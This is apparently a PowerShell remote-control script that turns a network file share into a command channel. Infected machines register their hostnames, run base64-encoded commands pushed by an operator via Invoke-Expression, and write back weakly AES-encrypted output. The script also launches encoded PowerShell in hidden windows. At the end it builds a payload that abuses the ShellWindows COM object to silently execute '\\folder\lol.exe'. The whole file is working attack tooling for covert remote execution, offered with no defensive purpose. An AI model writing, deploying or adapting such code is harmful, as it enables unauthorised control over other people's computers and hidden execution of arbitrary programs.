$outputspath = '\\folder\ffa\ni\'
$pool = $outputspath+'j'
$command = $outputspath+'woops'


function dostuff(){
$tars = gc $pool
$name = $env:COMPUTERNAME.ToLower()
if($tars -notcontains $name){
$name >> $pool
}

$x = Import-Clixml $command
$t = $x.t
if(($name -in $t) -or '@ll_0f_1t' -in $t){
    
$c = [text.encoding]::Unicode.GetString([convert]::FromBase64String($x.c))
$errors = $error.Count
$out = ((iex $c) -join "`n") + "`n"
$errors = $error.count - $errors 
if($errors -gt 0){
(0..($errors-1)) | %{$out += ($error[$_] -join "`n")+"`n"}
}
$md5 = New-Object -typename System.Security.Cryptography.md5CryptoServiceProvider
$enc = new-object -typename System.Text.UnicodeEncoding
$iv = $md5.ComputeHash($enc.GetBytes($name)) #lol!!!
$key = $md5.ComputeHash($enc.getbytes($c))*2 #even more lol!


$aes = New-Object system.security.cryptography.aesmanaged 
$aes.IV = $iv
$aes.Key = $key
$outbytes = $enc.GetBytes($out)
$z = $aes.CreateEncryptor()

$encrypted = [convert]::ToBase64String($z.TransformFinalBlock($outbytes,0,$outbytes.Count))
$outfile = $outputspath+[convert]::ToBase64String($key).Substring(0,3)+[convert]::ToBase64String($iv)
[io.file]::WriteAllText($outfile,$encrypted)
}
}
#control functions, move to another file
function all(){
gc $pool
}

function sendcmd([string]$cmd,[array]$tars,[int]$timeout=15000){
$a = New-Object psobject -Property @{'t'=$tars;'c'=[convert]::ToBase64String([text.encoding]::Unicode.getbytes($cmd));'m'=$timeout}
$a | Export-Clixml $command
}

function decryptoutput([string]$cmd,[string]$tar){
$tar = $tar.ToLower()
$md5 = New-Object -typename System.Security.Cryptography.md5CryptoServiceProvider
$enc = new-object -typename System.Text.UnicodeEncoding
$iv = $md5.ComputeHash($enc.GetBytes($tar)) #lol!!!
$key = $md5.ComputeHash($enc.getbytes($cmd))*2 #even more lol!

$aes = New-Object system.security.cryptography.aesmanaged 
$aes.IV = $iv
$aes.Key = $key
$outfile = [convert]::ToBase64String($key).Substring(0,3)+[convert]::ToBase64String($iv)
$outfile = $outputspath+[bitconverter]::tostring($md5.ComputeHash($enc.GetBytes($outfile)))
$f = [convert]::FromBase64String([io.file]::ReadAllText($outfile))
$z = $aes.CreateDecryptor()
[text.encoding]::Unicode.GetString($z.TransformFinalBlock($f,0,$f.Count))

}

function massoutput([string]$cmd,[array]$tars){
if($tars -eq '@ll_0f_1t'){$tars = all}
$tars | %{try{"$_>>>";decryptoutput $cmd $_}catch{'no output?'}}
}

function e($zz){
$d = $zz.m 
$u = New-Object System.Diagnostics.ProcessStartInfo
$u.FileName = 'powershell.exe'
$u.RedirectStandardError = 1
$u.RedirectStandardOutput = 1
$u.UseShellExecute = 0
$u.Arguments = '-enc '+$zz.c
$u.WindowStyle = 'hidden'
$u.CreateNoWindow = 1
$p = New-Object System.Diagnostics.Process
$p.StartInfo = $u
$p.start() | Out-Null
$p.WaitForExit($d) | Out-Null
if($p.HasExited){
$s1 = $p.StandardOutput.ReadToEnd()
$s2 = $p.StandardError.ReadToEnd()
$s1+"`n"+$s2+"`n"+$p.ExitCode
}
else{
'timeout'
}
$p.Dispose()
}

#$a=([system.activator]::createinstance([type]::gettypefromclsid("9ba05972-f6a8-11cf-a442-00a0c90a8f39"))).item().document.application;while(1){$a.WindowSwitcher()}


$z = "([system.activator]::createinstance([type]::gettypefromclsid('9ba05972-f6a8-11cf-a442-00a0c90a8f39'))).item().document.application.shellexecute('\\folder\lol.exe','','C:\Windows\system32',$null,0)"
$b = [convert]::ToBase64String([text.encoding]::utf8.getbytes($z))